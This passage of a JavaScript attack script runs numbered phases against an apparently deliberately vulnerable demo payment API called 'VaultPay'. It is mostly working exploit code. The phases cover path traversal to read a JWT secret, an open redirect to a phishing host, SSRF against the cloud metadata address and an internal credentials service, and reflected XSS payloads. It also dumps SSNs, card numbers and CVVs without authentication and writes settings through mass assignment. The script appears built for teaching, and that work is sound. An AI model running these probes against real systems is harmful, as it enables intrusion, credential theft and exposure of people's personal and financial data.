  const acac = res.headers["access-control-allow-credentials"] || "";
  if (acao === "*" || acao === evilOrigin) {
    bad(`CORS allows attacker origin → Access-Control-Allow-Origin: ${acao}`);
    loot("ACA-Origin", acao);
    if (acac) loot("ACA-Credentials", acac);
    record(
      "INFO",
      "Health response permits cross-origin reads",
      acao === "*"
        ? "Wildcard CORS permits non-credentialed browser reads. It does not permit credentials: include response access or reveal a victim's bearer token. Public health data alone does not prove harmful misconfiguration."
        : `Allows the tested origin ${evilOrigin}. One origin is not proof of unrestricted reflection; credentialed access and sensitive-data impact are untested.`,
      { kind: "misconfig", owasp: "API8" }
    );
  } else if (!acao) {
    ok("No Access-Control-Allow-Origin for foreign Origin (CORS not open to evil.example)");
  } else {
    ok(`CORS restricted (ACA-Origin=${acao})`);
  }
}

/**
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *   PHASE 05  ·  Oversized JSON body (demo misconfig — not Express default)
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 * Function: phaseBodyLimit
 * Endpoint: POST /api/auth/login with ~1.5 MiB password field
 *
 * Honest demo: Express express.json() default limit is 100kb → 413.
 * This app raised BODY_LIMIT (~50mb) so the probe proves misconfig, not a framework default.
 */
async function phaseBodyLimit() {
  step("Oversized JSON body (demo misconfig — not Express default)");
  intent(
    "Honest: when used, express.json() (body-parser) defaults limit to '100kb' and rejects larger bodies with 413. This demo uses a custom ~50mb parser so Workers + the attack still work."
  );
  narrate("Building a ~1.5 MiB password field and POSTing it to /api/auth/login…");
  const pad = "x".repeat(1.5 * 1024 * 1024);
  try {
    const res = await http("POST", "/api/auth/login", {
      body: { email: "nobody@example.com", password: pad },
      timeoutMs: 60_000,
      label: "1.5MiB-body",
    });
    if (res.status === 413) {
      ok(`Server rejected oversized body with 413 (${res.ms}ms)`);
    } else if (res.status === 401 && res.json?.error === "No account for that email") {
      bad(
        `Accepted ~1.5 MiB JSON → HTTP ${res.status} in ${res.ms}ms (demo raised the limit; Express default is 100kb)`
      );
      record(
        "HIGH",
        "Login accepts approximately 1.5 MiB JSON body",
        "Observed login-handler rejection after parsing the oversized payload. Demo source defaults BODY_LIMIT to 50mb; this probe does not measure the maximum limit or demonstrate DoS. Express express.json() defaults to 100kb.",
        { kind: "misconfig", owasp: "API4" }
      );
    } else {
      info(`Large-body result inconclusive: status=${res.status}, elapsed=${res.ms}ms; handler-level parsing not confirmed`);
    }
  } catch (err) {
    info(`Large body probe error: ${err.message}`);
  }
}

/**
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *   PHASE 06  ·  Login flood — observed authentication throttling
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 * Function: phaseNoRateLimitFlood
 * Endpoint: 40× parallel POST /api/auth/login (wrong passwords; wire logs collapsed)
 * Skip:     --skip-flood (banner still prints; body short-circuits)
 *
 * Observes one bounded batch; it does not measure every possible throttle window.
 */
async function phaseNoRateLimitFlood() {
  step("Login flood — observed authentication throttling");
  intent(
    "Express core has no login rate limiter. This bounded batch checks wrong-password attempts on one account; it cannot rule out other throttle thresholds or time windows."
  );
  if (skipFlood) {
    info("Skipped (--skip-flood)");
    return;
  }
  const N = 40;
  const idBefore = reqSeq;
  narrate(`Firing ${N} parallel POST /api/auth/login with wrong passwords…`);
  const t0 = Date.now();
  const results = await Promise.all(
    Array.from({ length: N }, (_, i) =>
      http("POST", "/api/auth/login", {
        body: { email: "alice@example.com", password: "wrong-password" },
        timeoutMs: 20_000,
        silent: true,
        label: `flood-${i}`,
      }).catch((e) => ({ status: 0, error: e.message, ms: 0 }))
    )
  );
  const ms = Date.now() - t0;
  const statuses = results.map((r) => r.status);
  const counted = statuses.reduce((m, s) => {
    m[s] = (m[s] || 0) + 1;
    return m;
  }, {});
  const got429 = statuses.filter((s) => s === 429).length;
  const got401 = results.filter((result) => result.status === 401 && result.json?.error === "Incorrect password").length;
  const idAfter = reqSeq;

  console.log(
    `  ${c.cyan}${c.bold}→ SEND${c.reset}  ${c.bold}#${idBefore + 1}–#${idAfter}${c.reset}  ${N}× parallel POST /api/auth/login  ${c.dim}(wire logs collapsed)${c.reset}`
  );
  console.log(
    `  ${c.green}${c.bold}← RECV${c.reset}  flood batch  finished in ${c.bold}${ms}ms${c.reset}  histogram=${JSON.stringify(counted)}`
  );

  if (got429 === 0 && got401 >= N * 0.7) {
    bad(`${got401}/${N} attempts returned the normal wrong-password error; zero 429 responses`);
    record(
      "HIGH",
      "No authentication throttling observed in this batch",
      `${got401}/${N} concurrent attempts returned Incorrect password, zero 429. Does not prove absence of all lockouts, delays, or longer-window limits. Resource-abuse risks also relate to API4.`,
      { kind: "framework-gap", owasp: "API2", cwe: "CWE-307" }
    );
  } else if (got429 > 0) {
    ok(`Server rate-limited some requests (${got429} × 429)`);
  } else {
    info(`Authentication throttle probe inconclusive: ${JSON.stringify(counted)}`);
  }
}

/**
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *   PHASE 07  ·  Path traversal on /api/files (no login)
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 * Function: phasePathTraversal
 * Endpoints: GET /api/files?name=welcome.txt (legit), then ../secrets/jwt-backup.txt
 *
 * App-code hole: vfs join with no jail. On success, steals JWT_SECRET into stolen.jwtSecret.
 */
async function phasePathTraversal() {
  step("Path traversal on /api/files (no login)");
  intent("App file endpoint joins user input with no jail — not an Express default.");
  narrate("First, read the intended public file…");
  const legit = await http("GET", "/api/files?name=welcome.txt", { label: "legit-file" });
  if (legit.status === 200 && /Welcome to VaultPay/i.test(legit.text)) {
    ok("welcome.txt is readable (expected)");
  } else {
    info(`welcome.txt → ${legit.status}`);
  }

  narrate("Now walk up directories into data/secrets/…");
  const attempts = ["../secrets/jwt-backup.txt", "..\\secrets\\jwt-backup.txt"];
  let hit = null;
  for (const t of attempts) {
    const res = await http("GET", `/api/files?name=${encodeURIComponent(t).replace(/%2F/gi, "/")}`, {
      label: `traverse:${t}`,
    });
    if (res.status === 200 && /JWT_SECRET=/.test(res.text)) {
      hit = { t, body: res.text };
      break;
    }
    const res2 = await http("GET", `/api/files?name=${t}`, { label: `traverse-raw:${t}` });
    if (res2.status === 200 && /JWT_SECRET=/.test(res2.text)) {
      hit = { t, body: res2.text };
      break;
    }
  }

  if (hit) {
    bad(`Path traversal succeeded with name=${hit.t}`);
    loot("secret-file", hit.body.replace(/\s+/g, " ").trim());
    const m = /JWT_SECRET=(\S+)/.exec(hit.body);
    if (m) {
      stolen.jwtSecret = stolen.jwtSecret || m[1];
      loot("JWT_SECRET", stolen.jwtSecret);
    }
    record(
      "CRITICAL",
      "Path traversal exposes virtual secret-file contents",
      "Demo in-memory VFS joins input without containment; no disk files were read. The hard-coded backup key may differ from the active signing key; JWT acceptance is tested separately.",
      { kind: "app-code", cwe: "CWE-22" }
    );
  } else {
    ok("Path traversal did not yield secrets (unexpected for this demo)");
  }
}

/**
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *   PHASE 08  ·  Open redirect on /api/go (no login)
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 * Function: phaseOpenRedirect
 * Endpoint: GET /api/go?url=https://evil-phish.example/steal
 *
 * App res.redirect(user URL) with no allowlist — 3xx Location points at attacker host.
 */
async function phaseOpenRedirect() {
  step("Open redirect on /api/go (no login)");
  intent("App res.redirect(user input) with no allowlist — framework has no safe-redirect helper.");
  const evil = "https://evil-phish.example/steal";
  narrate(`Requesting redirect to ${evil}…`);
  const res = await http("GET", `/api/go?url=${encodeURIComponent(evil)}`, {
    label: "open-redirect",
  });
  const loc = res.headers.location || "";
  if (res.status >= 300 && res.status < 400 && loc.includes("evil-phish.example")) {
    bad(`Browser would follow Location → ${loc}`);
    loot("redirect-to", loc);
    record(
      "HIGH",
      "Open redirect",
      "Any absolute URL accepted — app-code; res.redirect(url) does not validate destinations (Express security guide: prevent open redirects)",
      { kind: "app-code", cwe: "CWE-601" }
    );
  } else {
    ok(`Redirect not open (status ${res.status}, location=${loc || "none"})`);
  }
}

/** Classic cloud IMDS URL (demo teaching target — may fail on CF/Vercel). */
const AWS_IMDS_URL = "http://169.254.169.254/latest/meta-data/";

/**
 * SSRF helper (no own PHASE banner) — runs under:
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *   PHASE 09  ·  Open proxy / SSRF on /api/proxy (no login)
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 * Called from {@link phaseSsrfProxy}. Wire: ssrf-imds
 * Endpoint: GET /api/proxy?url=http://169.254.169.254/latest/meta-data/
 *
 * Probe cloud-metadata-style egress; failed or unrecognized responses are inconclusive.
 * @param {{ proxyAlive: boolean }} opts - false when /api/proxy is missing
 */
async function probeMetadataEgress(opts = { proxyAlive: true }) {
  if (!opts.proxyAlive) {
    info("Skipping IMDS probe — open proxy endpoint not available");
    return;
  }
  narrate(
    `Cloud-metadata style egress: open-proxy fetch of ${AWS_IMDS_URL} (classic EC2 IMDS — teaching target)…`
  );
  let meta;
  try {
    meta = await http("GET", `/api/proxy?url=${encodeURIComponent(AWS_IMDS_URL)}`, {
      timeoutMs: 8_000,
      label: "ssrf-imds",
    });
  } catch (err) {
    info(`IMDS probe transport error: ${err.message}`);
    info("Metadata reachability and the reason for failure are unconfirmed; no metadata finding recorded.");
    return;
  }

  const body = (meta.text || "").replace(/\s+/g, " ").trim();
  // Upstream errors from our proxy are usually JSON { error, detail } with 502.
  const proxyReportedFail =
    meta.status === 502 ||
    meta.status === 400 ||
    /Upstream fetch failed|ENOTFOUND|ECONNREFUSED|timeout|EHOSTUNREACH|ECONNRESET/i.test(body);

  const looksLikeImds =
    meta.status === 200 &&
    body.length > 0 &&
    !proxyReportedFail &&
    (/ami-id|instance-id|iam\/|meta-data|local-ipv4|public-ipv4|hostname/i.test(body) ||
      /^(ami-|i-)[a-z0-9-]+/i.test(body));

  if (looksLikeImds) {
    bad("Metadata-shaped response returned for link-local URL");
    loot("imds-snippet", body.slice(0, 160));
    record(
      "HIGH",
      "SSRF returns metadata-shaped content from link-local URL",
      "Response resembles metadata; this probe does not authenticate its source or retrieve usable IAM credentials. EC2 credential exposure depends on IMDS configuration and an attached role.",
      { kind: "app-code", owasp: "API7" }
    );
    return;
  }

  if (meta.status === 200 && body.length > 20 && !proxyReportedFail) {
    info(`Metadata URL returned HTTP 200 (${body.length} B); upstream identity unconfirmed`);
    loot("imds-body", body.slice(0, 120));
    info("No metadata-specific vulnerability recorded from an unrecognized response.");
    return;
  }

  info(
    `IMDS probe → status=${meta.status}; metadata reachability not demonstrated. Source inspection shows no app URL allowlist, but this response does not establish platform egress policy.`
  );
}

/**
 * SSRF helper (no own PHASE banner) — runs under:
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *   PHASE 09  ·  Open proxy / SSRF on /api/proxy (no login)
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 * Called from {@link phaseSsrfProxy}. Wire: ssrf-internal, ssrf-redirect-hop
 * Gate: only when --internal=URL (or INTERNAL_SERVICE_URL) is set
 *
 * Pivot against a stand-in "internal service" (`scripts/internal-service.mjs`).
 * Real IMDS is unreachable from Workers/Vercel; this models the same class:
 * a host the API can reach and the attacker often cannot.
 *
 * Two probes:
 *  1. direct — proxy fetches the internal IAM-shaped URL
 *  2. hop    — proxy follows a redirect within the same stand-in service
 *              (`redirect: "follow"`); no allowlist bypass is established
 *
 * @param {{ proxyAlive: boolean }} opts
 */
async function probeInternalPivot(opts = { proxyAlive: true }) {
  if (!internalService) return;
  if (!opts.proxyAlive) {
    info("Skipping internal-pivot probe — open proxy endpoint not available");
    return;
  }

  const credsPath = "/latest/meta-data/iam/security-credentials/vaultpay-demo-role";
  const internalUrl = `${internalService}${credsPath}`;

  narrate(`Reachability check: can WE fetch the same stand-in resource directly?`);
  let attackerReach = false;
  try {
    const direct = await fetch(internalUrl, {
      signal: AbortSignal.timeout(2500),
    });
    attackerReach = direct.ok;
  } catch {
    attackerReach = false;
  }
  if (attackerReach) {
    // Laptop demo: attacker and server share a host, so we cannot *simulate*
    // unroutability. Say what is and isn't being modelled — the mechanic below
    // (server fetches a URL you chose, hands you the body) is the real part.
    info("Laptop run: attacker and API share a host, so this service is reachable from here too");
    info("This run does not demonstrate a private-network boundary; the credentials are fabricated demo data");
  } else {
    info("Direct client fetch failed; this alone does not prove the service is internal-only");
  }

  narrate(`Asking the SERVER to fetch it instead: ${internalUrl}`);
  const pivot = await http("GET", `/api/proxy?url=${encodeURIComponent(internalUrl)}`, {
    timeoutMs: 8_000,
    label: "ssrf-internal",
  });
  const body = (pivot.text || "").replace(/\s+/g, " ").trim();
  if (pivot.status === 200 && /AccessKeyId|SecretAccessKey|Token/i.test(body)) {
    bad("Server fetched the separate metadata stand-in and returned fabricated credentials");
    loot("internal-creds", body.slice(0, 180));
    record(
      "HIGH",
      "SSRF fetches metadata stand-in credentials",
      `Fabricated credentials from the separate demo service, not real IAM credentials. Direct client fetch ${attackerReach ? "also succeeded; no private-network boundary demonstrated" : "failed; network isolation remains unconfirmed"}.`,
      { kind: "app-code", owasp: "API7" }
    );
  } else {
    info(`Internal pivot → ${pivot.status} ${body.slice(0, 80)}`);
  }

  narrate("Now test redirect following within the same stand-in service (not an allowlist bypass)…");
  const hopUrl = `${internalService}/redirect?to=${encodeURIComponent(credsPath)}`;
  const hop = await http("GET", `/api/proxy?url=${encodeURIComponent(hopUrl)}`, {
    timeoutMs: 8_000,
    label: "ssrf-redirect-hop",
  });
  const hopBody = (hop.text || "").replace(/\s+/g, " ").trim();
  if (hop.status === 200 && /AccessKeyId|SecretAccessKey|Token/i.test(hopBody)) {
    bad("Proxy followed the stand-in redirect and returned fabricated credentials");
    loot("hop-creds", hopBody.slice(0, 140));
    info("Additional evidence for the same proxy flaw; no new finding or allowlist bypass counted. Production SSRF defenses must validate every destination or disable redirects.");
  } else {
    info(`Redirect-hop probe → ${hop.status}`);
  }
}

/**
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *   PHASE 09  ·  Open proxy / SSRF on /api/proxy (no login)
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 * Function: phaseSsrfProxy
 * Endpoints / wire labels:
 *   - ssrf-self      GET /api/proxy?url=<BASE>/api/debug/config
 *   - ssrf-external  GET /api/proxy?url=https://example.com/  (fallback if CF 1042)
 *   - then {@link probeMetadataEgress}  (ssrf-imds)
 *   - then {@link probeInternalPivot}   (ssrf-internal, ssrf-redirect-hop; needs --internal)
 *
 * May loot JWT_SECRET via self-fetch of /api/debug/config. Platform notes when
 * edge blocks self-subrequests (e.g. Cloudflare error 1042).
 */
async function phaseSsrfProxy() {
  step("Open proxy / SSRF on /api/proxy (no login)");
  intent(
    "Unrestricted server-side fetch(user URL): self-hit, arbitrary external, and cloud-metadata class. No egress policy in Express core — you must add one."
  );
  let proxyAlive = true;
  const loop = `${BASE}/api/debug/config`;
  narrate(`Asking the server to fetch its own debug config: ${loop}`);
  const res = await http("GET", `/api/proxy?url=${encodeURIComponent(loop)}`, {
    timeoutMs: 12_000,
    label: "ssrf-self",
  });
  if (res.status === 200 && /jwtSecret|supersecret/i.test(res.text)) {
    bad("Open proxy fetched own debug config and returned secrets");
    loot("ssrf-body", res.text.slice(0, 240));
    try {
      const j = JSON.parse(res.text);
      if (j.jwtSecret) {
        stolen.jwtSecret = stolen.jwtSecret || j.jwtSecret;
        loot("JWT_SECRET", stolen.jwtSecret);
      }
    } catch {
      /* ignore */
    }
    record(
      "CRITICAL",
      "SSRF proxy returns its public debug endpoint's secret",
      "Observed server-side self-fetch of the public BASE URL. This proves proxying the secret response, not access to an internal-only network destination.",
      { kind: "app-code", owasp: "API7" }
    );
  } else if (res.status === 200) {
    bad(`Open proxy returned 200 for self-URL (body may vary)`);
    record("HIGH", "Open proxy endpoint exists", res.text.slice(0, 120), {
      kind: "app-code",
      owasp: "API7",
    });
  } else if (res.status === 404 && /error code:\s*1042/i.test(res.text || "")) {
    notePlatform(
      "Self-fetch blocked by Cloudflare (error 1042) — not app authz",
      "Workers often refuse same-origin/self subrequests. The /api/proxy hole may still work for other URLs."
    );
    const external = "https://example.com/";
    narrate(`Fallback: open-proxy fetch of ${external}…`);
    const ext = await http("GET", `/api/proxy?url=${encodeURIComponent(external)}`, {
      timeoutMs: 12_000,
      label: "ssrf-external",
    });
    if (ext.status === 200 && /example|domain|illustrative/i.test(ext.text)) {
      bad("Server-side open proxy fetched an arbitrary external URL");
      loot("proxy-snippet", ext.text.replace(/\s+/g, " ").trim().slice(0, 120));
      record(
        "HIGH",
        "Open proxy: server fetches arbitrary URLs (SSRF surface)",
        "Self-target blocked by CF 1042; external target succeeded — open proxy, not a framework feature",
        { kind: "app-code", owasp: "API7" }
      );
    } else {
      info(`External proxy probe → ${ext.status} (self still CF-blocked)`);
    }
  } else if (res.status === 404 && /not found/i.test(res.text || "")) {
    ok("Open proxy route disabled (404)");
    proxyAlive = false;
  } else {
    info(`Self-proxy probe → ${res.status}`);
    const external = "https://example.com/";
    narrate(`Fallback: open-proxy fetch of ${external}…`);
    const ext = await http("GET", `/api/proxy?url=${encodeURIComponent(external)}`, {
      timeoutMs: 12_000,
      label: "ssrf-external",
    });
    if (ext.status === 200 && ext.text.length > 20) {
      bad("Server-side open proxy fetched an arbitrary external URL");
      record(
        "HIGH",
        "Open proxy: server fetches arbitrary URLs (SSRF surface)",
        "App /api/proxy with no allowlist",
        { kind: "app-code", owasp: "API7" }
      );
    } else if (ext.status === 404) {
      proxyAlive = false;
      ok("Open proxy route disabled (404)");
    } else {
      info(`External proxy probe → ${ext.status}`);
    }
  }

  await probeMetadataEgress({ proxyAlive });
  await probeInternalPivot({ proxyAlive });
}

/**
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *   PHASE 10  ·  Error stack leak + reflected XSS sink (no login)
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 * Function: phaseStackAndEcho
 * Endpoints:
 *   - GET /api/boom              (stack leak; wire: stack-leak)
 *   - GET /api/echo?msg=…        (HTML reflection; wire: html-echo-mild / xss-echo-noisy)
 *
 * Stack: demo custom error handler (misconfig vs Express production default).
 * XSS: app text/html echo sink (app-code). Edge WAF may 403 noisy payloads.
 */
async function phaseStackAndEcho() {
  step("Error stack leak + reflected XSS sink (no login)");
  intent(
    "Stack leak: custom error handler — Express default error path uses finalhandler, which omits err.stack when NODE_ENV=production. XSS: app HTML echo."
  );
  narrate("Triggering an intentional server error…");
  const boom = await http("GET", "/api/boom", { label: "stack-leak" });
  if (boom.status >= 500 && boom.json?.stack) {
    bad("Stack trace returned to the client (custom error handler — not Express production default)");
    loot("stack-top", String(boom.json.stack).split("\n")[0]);
    record(
      "MEDIUM",
      "Custom handler exposes stack trace",
      "Observed stack JSON; deployment mode is not established by this probe. Demo source always includes stacks, unlike Express finalhandler when NODE_ENV=production.",
      { kind: "misconfig", owasp: "API8" }
    );
  } else {
    ok(`No stack in boom response (${boom.status})`);
  }

  // Mild reflection first (less likely to trip edge WAF than onerror=alert).
  const mild = "<b>vaultpay-reflected</b>";
  narrate("Reflecting mild HTML through /api/echo (text/html)…");
  const mildRes = await http("GET", `/api/echo?msg=${encodeURIComponent(mild)}`, {
    label: "html-echo-mild",
  });
  if (
    mildRes.status === 200 &&
    mildRes.text.includes(mild) &&
    /text\/html/i.test(mildRes.headers["content-type"] || "")
  ) {
    bad("User input reflected as text/html without encoding (app XSS sink)");
    loot("reflected", mild);
    record(
      "HIGH",
      "App code: reflected HTML echo sink (XSS class)",
      "Unescaped HTML reflected in an HTML response. This mild payload proves HTML injection; browser JavaScript execution and CSP effectiveness were not tested.",
      { kind: "app-code", cwe: "CWE-79" }
    );
  } else {
    const xss = `<img src=x onerror=alert(1)>`;
    narrate("Trying noisier XSS payload (may trip edge WAF)…");
    const echo = await http("GET", `/api/echo?msg=${encodeURIComponent(xss)}`, {
      label: "xss-echo-noisy",
    });
    if (
      echo.status === 200 &&
      echo.text.includes(xss) &&
      /text\/html/i.test(echo.headers["content-type"] || "")
    ) {
      bad("Noisy XSS payload reflected as HTML");
      loot("reflected", xss);
      record(
        "HIGH",
        "App code: reflected XSS via HTML echo endpoint",
        "Developer built this sink — Express does not echo HTML by default",
        { kind: "app-code", cwe: "CWE-79" }
      );
    } else if (echo.status === 403 || mildRes.status === 403) {
      notePlatform(
        "Edge WAF returned 403 on XSS/HTML probe — not Express output encoding",
        "Edge may block attack-shaped queries. App still has /api/echo sink if WAF misses."
      );
    } else {
      ok(`HTML echo probes did not prove reflection (mild=${mildRes.status} noisy=${echo.status})`);
    }
  }
}

/**
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *   PHASE 11  ·  Slow handler holds the connection (no login)
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 * Function: phaseSlowTimeout
 * Endpoint: GET /api/slow?ms=3000  (wire: slow-handler)
 * Skip:     --skip-slow (banner still prints; body short-circuits)
 *
 * Observes a client-selected 3s delay, not the absence of every execution deadline.
 * Node requestTimeout limits request reception, not handler execution.
 */
async function phaseSlowTimeout() {
  step("Slow handler holds the connection (no login)");
  intent(
    "This probe measures a 3s handler response. Node requestTimeout limits receiving the request, not handler execution. A successful response cannot rule out longer execution deadlines."
  );
  if (skipSlow) {
    info("Skipped (--skip-slow)");
    return;
  }
  narrate("Calling /api/slow?ms=3000 and measuring wall time…");
  const res = await http("GET", "/api/slow?ms=3000", {
    timeoutMs: 10_000,
    label: "slow-handler",
  });
  if (res.status === 200 && res.ms >= 2500) {
    bad(`Handler held the connection for ${res.ms}ms; no shorter execution deadline observed`);
    record(
      "MEDIUM",
      "Client-selected delay holds a request for approximately 3 seconds",
      "Observed delay on a public demo handler. Source caps delay at 120s; this probe does not establish no timeouts or demonstrate resource exhaustion. Execution budgets depend on endpoint requirements.",
      { kind: "framework-gap", owasp: "API4" }
    );
  } else if (res.status === 400 || res.status === 404) {
    ok(`Slow endpoint closed or disabled (${res.status})`);
  } else {
    info(`slow probe status=${res.status} elapsed=${res.ms}ms`);
  }
}

/**
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *   PHASE 12  ·  Unauthenticated data theft (users / IDOR / search / debug)
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 * Function: phaseUnauthDataTheft
 * Endpoints / wire labels:
 *   - user-dump    GET /api/users
 *   - idor-user    GET /api/users/:id
 *   - debug-leak   GET /api/debug/config   → may set stolen.jwtSecret
 *   - pii-search   GET /api/search?q=oslo
 *
 * JWT claim beat: full PII with no password and no token. Fills stolen.users.
 */
async function phaseUnauthDataTheft() {
  step("Unauthenticated data theft (users / IDOR / search / debug)");
  intent("JWT claim: no password, no token — full PII. Authn was never applied.");

  narrate("Dumping /api/users with zero Authorization header…");
  const usersRes = await http("GET", "/api/users", { label: "user-dump" });
  if (usersRes.status === 200 && Array.isArray(usersRes.json?.users)) {
    stolen.users = usersRes.json.users;
    bad(`Returned ${stolen.users.length} full accounts without auth`);
    for (const u of stolen.users) {
      loot(
        `#${u.id} ${u.email}`,
        `role=${u.role} ssn=${u.ssn} card=${u.cardNumber} cvv=${u.cardCvv}`
      );
    }
    record(
      "CRITICAL",
      "Unauthenticated user dump",
      "No auth middleware on collection route — app left it public",
      { kind: "app-code", owasp: "API5" }
    );
  } else {
    ok(`GET /api/users → ${usersRes.status}`);
  }

  const id = stolen.users[0]?.id ?? 1;
  narrate(`IDOR: fetch /api/users/${id} still without auth…`);
  const one = await http("GET", `/api/users/${id}`, { label: "idor-user" });
  if (one.status === 200 && one.json?.user?.ssn) {
    bad(`Full PII for user #${id}`);
    loot("SSN", one.json.user.ssn);
    loot("card", one.json.user.cardNumber);
    loot("CVV", one.json.user.cardCvv);
    loot("note", one.json.user.internalNote);
    record(
      "CRITICAL",
      "IDOR on /api/users/:id without auth",
      "Walk the id space — no auth, no ownership check",
      { kind: "app-code", owasp: "API1" }
    );
  }

  narrate("Checking leftover debug endpoint…");
  const dbg = await http("GET", "/api/debug/config", { label: "debug-leak" });
  if (dbg.status === 200 && dbg.json?.jwtSecret) {
    stolen.jwtSecret = dbg.json.jwtSecret;
    bad("Debug config is public");
    loot("JWT_SECRET", stolen.jwtSecret);
    loot("featureFlags", JSON.stringify(dbg.json.featureFlags || {}));
    record(
      "CRITICAL",
      "Debug endpoint leaks JWT signing secret",
      "App left /api/debug/config public — forge any identity next",
      { kind: "app-code", owasp: "API8" }
    );
  }

  narrate('Searching PII with q="oslo"…');
  const search = await http("GET", "/api/search?q=oslo", { label: "pii-search" });
  if (search.status === 200 && (search.json?.results?.length || 0) > 0) {
    bad(`Search returned ${search.json.results.length} PII hits without auth`);
    for (const r of search.json.results) {
      loot(r.email, `${r.name} | ${r.address} | ${r.ssn}`);
    }
    record(
      "HIGH",
      "Unauthenticated PII search",
      "Search exposes sensitive object properties without filtering (API3), and lacks function access control (also API5).",
      { kind: "app-code", owasp: "API3" }
    );
  }
}

/**
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *   PHASE 13  ·  Account enumeration via login error messages
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 * Function: phaseAccountEnumeration
 * Endpoints:
 *   - user-enum-missing   POST /api/auth/login  (unknown email)
 *   - user-enum-wrong-pw  POST /api/auth/login  (alice@example.com, wrong password)
 *
 * Different error strings for missing user vs wrong password ⇒ free user discovery.
 * (Wire labels use "user-enum" = user enumeration — not a programming enum.)
 */
async function phaseAccountEnumeration() {
  step("Account enumeration via login error messages");
  intent("Same generic error always. Different messages = free user discovery.");
  narrate("Compare login errors for missing email vs wrong password…");
  const missing = await http("POST", "/api/auth/login", {
    body: { email: "definitely-not-registered@example.com", password: "x" },
    label: "user-enum-missing",
  });
  const wrong = await http("POST", "/api/auth/login", {
    body: { email: "alice@example.com", password: "not-the-password" },
    label: "user-enum-wrong-pw",
  });
  const e1 = missing.json?.error || missing.text;
  const e2 = wrong.json?.error || wrong.text;
  loot("missing-user-error", e1);
  loot("wrong-password-error", e2);
  if (missing.status === 401 && wrong.status === 401 &&
    e1 === "No account for that email" && e2 === "Incorrect password") {
    bad("Error strings differ — accounts are enumerable");
    record(
      "MEDIUM",
      "Login error messages enable account enumeration",
      "App returned different strings for missing user vs wrong password",
      { kind: "app-code", owasp: "API2" }
    );
  } else {
    info(e1 === e2 ? "No login-message discrepancy observed" : "Unexpected login responses; enumeration not confirmed");
  }
}

/**
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *   PHASE 14  ·  Unauthenticated settings write
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 * Function: phaseSettingsMerge
 * Endpoints:
 *   - settings-get      GET /api/settings
 *   - settings-put      PUT /api/settings  (mass-assign arbitrary keys)
 *   - settings-restore  PUT /api/settings  (restore for clean re-run; silent unless --verbose)
 */
async function phaseSettingsMerge() {
  step("Unauthenticated settings write");
  intent("State-changing PUT with no auth and no field allowlist.");
  const before = await http("GET", "/api/settings", { label: "settings-get" });
  narrate("PUT arbitrary keys into /api/settings…");
  const put = await http("PUT", "/api/settings", {
    body: {
      theme: "pwned",
      featureFlags: { betaTransfer: true, evil: true },
      injected: true,
    },
    label: "settings-put",
  });
  if (put.status === 200 && put.json?.settings?.injected === true) {
    bad("Settings mutated without authentication");
    loot("settings", JSON.stringify(put.json.settings));
    record(
      "HIGH",
      "Unauthenticated settings write accepts arbitrary properties",
      "Observed unauthorized global-settings mutation (API5). Arbitrary properties were accepted; privileged-property impact (API3) is not demonstrated by the injected flag.",
      { kind: "app-code", owasp: "API5", cwe: "CWE-915" }
    );
  } else {
    info(`settings probe → ${put.status}`);
  }
  if (before.json?.settings) {
    narrate("Reapplying previous settings; merge does not remove newly added keys…");
    await http("PUT", "/api/settings", {
      body: before.json.settings,
